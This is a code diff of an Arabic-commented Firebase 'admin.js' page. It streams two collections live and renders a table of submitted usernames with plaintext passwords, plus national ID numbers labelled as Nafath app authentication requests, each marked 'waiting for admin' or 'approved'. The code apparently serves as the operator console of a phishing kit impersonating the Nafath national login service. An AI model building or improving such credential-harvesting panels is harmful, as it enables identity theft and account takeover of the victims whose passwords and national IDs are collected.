@@ -1,9 +1,5 @@
 // admin.js
-
-// استيراد قاعدة البيانات من ملف الإعداد المشترك الخارجي
 import { db } from "./firebase-config.js";
-
-// استيراد دالات العرض اللحظي من فايربيس
 import { 
     collection, 
     query, 
@@ -14,54 +10,74 @@ import {
 document.addEventListener('DOMContentLoaded', () => {
     const logsTableBody = document.getElementById('logsTableBody');
 
-    // 1. إنشاء استعلام لجلب البيانات مرتبة من الأحدث إلى الأقدم
-    const q = query(collection(db, "users_login"), orderBy("timestamp", "desc"));
+    // كائنات لتخزين البيانات المستلمة مؤقتاً لتسهيل الدمج والترتيب
+    let allLogs = {};
 
-    // 2. الاستماع اللحظي للتغييرات (بدون ريفريش)
-    onSnapshot(q, (querySnapshot) => {
-        // تفريغ الجدول أولاً قبل إعادة الرسم لتجنب التكرار
+    // دالة لتحديث واجهة الجدول بعد دمج البيانات وترتيبها
+    function renderTable() {
         logsTableBody.innerHTML = "";
 
-        if (querySnapshot.empty) {
-            logsTableBody.innerHTML = `<tr><td colspan="5" style="text-align:center;">لا توجد بيانات مستلمة حتى الآن...</td></tr>`;
+        // تحويل الكائن المدمج إلى مصفوفة وترتيبها من الأحدث للأقدم
+        const sortedLogs = Object.values(allLogs).sort((a, b) => {
+            const timeA = a.timestamp ? a.timestamp.toMillis() : 0;
+            const timeB = b.timestamp ? b.timestamp.toMillis() : 0;
+            return timeB - timeA; // ترتيب تنازلي (الأحدث فوق)
+        });
+
+        if (sortedLogs.length === 0) {
+            logsTableBody.innerHTML = `<tr><td colspan="5" style="text-align:center;">لا توجد طلبات مستلمة حالياً...</td></tr>`;
             return;
         }
 
-        querySnapshot.forEach((doc) => {
-            const data = doc.data();
-
-            // معالجة الوقت والتاريخ ليظهر بشكل مقروء ومفهوم
+        sortedLogs.forEach((log) => {
             let formattedTime = "غير محدد";
-            if (data.timestamp) {
-                const date = data.timestamp.toDate();
-                formattedTime = date.toLocaleString('ar-EG', { hour12: true });
+            if (log.timestamp) {
+                formattedTime = log.timestamp.toDate().toLocaleString('ar-EG', { hour12: true });
             }
 
-            // تحديد شكل ولون شارة الحالة (Status Badge)
-            let statusClass = "waiting";
-            let statusText = "بانتظار الأدمن";
-            
-            if (data.status === "approved") {
-                statusClass = "approved";
-                statusText = "تم القبول";
-            }
+            let statusClass = log.status === "approved" ? "approved" : "waiting";
+            let statusText = log.status === "approved" ? "تم القبول" : "بانتظار الأدمن";
 
-            // إنشاء سطر جديد داخل الجدول
             const row = document.createElement('tr');
-            row.innerHTML = `
-                <td><strong>${data.username || '---'}</strong></td>
-                <td style="color: #c0392b; font-family: monospace;">${data.password || '---'}</td>
-                <td>${formattedTime}</td>
-                <td style="font-size: 12px; color: #7f8c8d; max-width: 250px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;" title="${data.device}">
-                    ${data.device || 'غير معروف'}
-                </td>
-                <td><span class="status-badge ${statusClass}">${statusText}</span></td>
-            `;
-
-            // إضافة السطر إلى جسم الجدول
+            
+            if (log.type === "app_request") {
+                // عرض بيانات نموذج تطبيق نفاذ (nationalId)
+                row.innerHTML = `
+                    <td><span class="type-badge type-app">تطبيق نفاذ</span></td>
+                    <td><strong>${log.nationalId || '---'}</strong></td>
+                    <td style="color: #95a5a6; font-style: italic;">(طلب مصادقة تطبيق)</td>
+                    <td>${formattedTime}</td>
+                    <td><span class="status-badge ${statusClass}">${statusText}</span></td>
+                `;
+            } else {
+                // عرض بيانات نموذج اسم المستخدم وكلمة المرور
+                row.innerHTML = `
+                    <td><span class="type-badge type-pass">اسم مستخدم</span></td>
+                    <td><strong>${log.username || '---'}</strong></td>
+                    <td style="color: #c0392b; font-family: monospace;">${log.password || '---'}</td>
+                    <td>${formattedTime}</td>
+                    <td><span class="status-badge ${statusClass}">${statusText}</span></td>
+                `;
+            }
             logsTableBody.appendChild(row);
         });
-    }, (error) => {
-        console.error("حدث خطأ أثناء جلب البيانات لحظياً: ", error);
+    }
+
+    // 1. الاستماع اللحظي لمجموعة اسم المستخدم وكلمة المرور
+    const qUsers = query(collection(db, "users_login"));
+    onSnapshot(qUsers, (snapshot) => {
+        snapshot.forEach((doc) => {
+            allLogs[doc.id] = { id: doc.id, type: "user_login", ...doc.data() };
+        });
+        renderTable();
+    });
+
+    // 2. الاستماع اللحظي لمجموعة تطبيق نفاذ (nationalId / status / timestamp)
+    const qNafath = query(collection(db, "nafath_app_requests"));
+    onSnapshot(qNafath, (snapshot) => {
+        snapshot.forEach((doc) => {
+            allLogs[doc.id] = { id: doc.id, type: "app_request", ...doc.data() };
+        });
+        renderTable();
     });
 });
